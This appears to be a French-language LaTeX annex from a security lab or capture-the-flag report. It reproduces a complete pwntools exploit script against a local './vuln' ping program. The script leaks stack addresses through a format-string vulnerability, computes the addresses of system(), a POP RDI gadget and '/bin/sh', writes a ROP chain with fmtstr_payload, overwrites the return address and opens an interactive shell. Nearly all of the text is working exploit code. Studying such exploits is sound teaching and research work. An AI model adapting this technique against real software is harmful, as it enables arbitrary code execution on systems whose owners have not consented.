\newpage
\section{Annexe : Script d'Exploitation Complet}

\begin{lstlisting}[language=Python, caption={Script final d'exploitation (exploit.py)}, label={code:exploit}]
#!/usr/bin/python3
from pwn import *
import re

######################################################
# CONFIGURATION
######################################################
prog = "./vuln"
context.arch = 'amd64'
context.log_level = 'info'

# On lance le processus via pwntools
p = process(prog)

# Offsets 
OFFSET_BUFFER = 16
DIST_BUFFER_RBP = 80
DIST_SAVEDRBP_RBP = 0x20
DIST_SAVEDRIP_GADGET = -0x70 
DIST_SAVEDRIP_SYSTEM = 0x3F3 
DIST_SAVEDRIP_RET = -0x6

#######################################################
# ETAPE 1 : Leak des adresses
#######################################################
log.info("=== Etape 1 : Leak des adresses ===")

# On attend de devoir rentrer le ping
p.recvuntil(b"address to ping:")

# Playload a injecter pour le leak
## Affiche le 26eme mot (Saved RBP) sur 16 caracteres fixes.
## Affiche le 27eme mot (Saved RIP) sur 16 caracteres fixes.
## Affiche 1 char de donnee + 202 espaces de remplissage.
## Ecrit la valeur du total (0xEE) a l'adresse pointee par l'arg 7.
payload = "%26$16p | %27$16p%203c%7$hhn"
p.sendline(payload.encode())

# Parsing de la reponse pour extraire les adresses
raw_response = p.recvuntil(b"ping").decode(errors='ignore')
leaks = re.findall(r"(0x[0-9a-fA-F]+)", raw_response) # On utilise une Regex pour trouver UNIQUEMENT les motifs "0x..."
saved_rbp = int(leaks[0], 16) # Saved RBP
saved_rip = int(leaks[1], 16) # Saved RIP

log.success(f"Saved RBP: {hex(saved_rbp)}")
log.success(f"Saved RIP: {hex(saved_rip)}")

##########################################################
# ETAPE 2 : Calcul des adresses
##########################################################
log.info("=== Etape 2 : Calcul des adresses ===")

# Calculs des addresses
addr_rbp = saved_rbp - DIST_SAVEDRBP_RBP
addr_ret = saved_rip - DIST_SAVEDRIP_RET
addr_system = saved_rip - DIST_SAVEDRIP_SYSTEM
addr_gadget = saved_rip - DIST_SAVEDRIP_GADGET
addr_str = addr_rbp + 40
addr_rip = addr_rbp + 8

log.info(f"Adresse de system(): {hex(addr_system)}")
log.info(f"Adresse du gadget POP RDI; RET: {hex(addr_gadget)}")
log.info(f"Adresse de la chaine '/bin/sh': {hex(addr_str)}")
log.info(f"Adresse de retour (pour ecraser): {hex(addr_rip)}")
log.info(f"Adresse du gadget RET (pour alignement): {hex(addr_ret)}")

# Definition de la chaine ROP
rop_chain = {
    addr_rbp + 16 : addr_gadget,         # adresse pop rdi; ret 
    addr_rbp + 24 : addr_str,            # adresse chaine
    addr_rbp + 32 : addr_system,         # addresse de sytem
    addr_rbp + 40 : u64(b'/bin/sh\x00'), # chaine 
}

###############################################################
# ETAPE 3 : Ecriture de la chaine ROP
###############################################################
log.info("=== Etape 3 : Ecriture de la chaine ROP ===")

# Ecriture de la chaine ROP
for addr, value in rop_chain.items():
    
    # Liste de tuples contenant (Adresse Cible, Valeur a ecrire)
    ## Les 4 octets de poids faible a l'adresse 'addr'
    ## Les 4 octets de poids fort a l'adresse 'addr + 4'
    mask32 = (1 << 32) - 1
    writes_sequence = [
        (addr, value & mask32),
        (addr + 4, (value >> 32) & mask32),
    ]

    for target_addr, part_value in writes_sequence:
        p.recvuntil(b"Please Insert an IP address to ping: ")
        
        current_writes = {
            target_addr: part_value, # La partie de la ROP chain
            addr_rip: 0xee           # Le maintien de la boucle
        }

        payload = fmtstr_payload(
            offset=OFFSET_BUFFER, 
            writes=current_writes, 
            write_size='short'
        )
        
        p.sendline(payload)
        log.info(f"Ecriture de {hex(part_value)} a l'adresse {hex(target_addr)}")

#####################################################################################
# ETAPE 4 : Ecriture de la chaine ROP pour executer system("/bin/sh")
#####################################################################################

# On ne veut que les deux derniers octets de l'adresse de retour
addr_ret_lsb = addr_ret & 0xff

# Payload pour ecraser l'adresse de retour avec le gadget RET
## addr_ret_lsb : Valeur cible a ecrire
## c : bourage
## %7$ : Specifie que l'adresse cible est le 7eme argument de la fonction d'affichage
## hhn : ecriture d'un octet a l'adresse pointee par l'argument 7
payload = f"%{addr_ret_lsb}c%7$hhn"
p.recvuntil("Please Insert an IP address to ping: ".encode())
p.sendline(payload.encode())				
log.info(f"Payload pour ecraser l'adresse de retour avec le gadget RET envoye (Valeur cible: {hex(addr_ret_lsb)})")

p.interactive()
\end{lstlisting}